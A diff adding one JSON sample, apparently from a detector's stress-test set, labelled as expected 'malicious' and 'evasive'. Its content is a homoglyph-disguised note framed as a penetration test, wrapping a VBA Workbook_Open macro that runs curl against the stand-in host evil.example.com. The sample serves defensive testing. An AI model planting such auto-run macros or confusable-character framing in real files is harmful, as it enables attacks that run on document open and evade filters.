@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::103::stress-variations::0",
+  "base_sample_id": "exp::document-office::103",
+  "generator_id": "stress-variations",
+  "generator_version": "1.0.0",
+  "seed": -1598650650,
+  "content": "---\nDéаr сoӏleague, régarԁing our penetration tеstìng engagement:\nPrivate Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl http://evil.example.com/\"\nEnd Sub\n\n---",
+  "content_hash": "addc51b1ff7c2334fb54299568d976a8f161cea8005757e83534c17f1ff15cdd",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "stress:framed-confusable",
+  "difficulty": "evasive"
+}
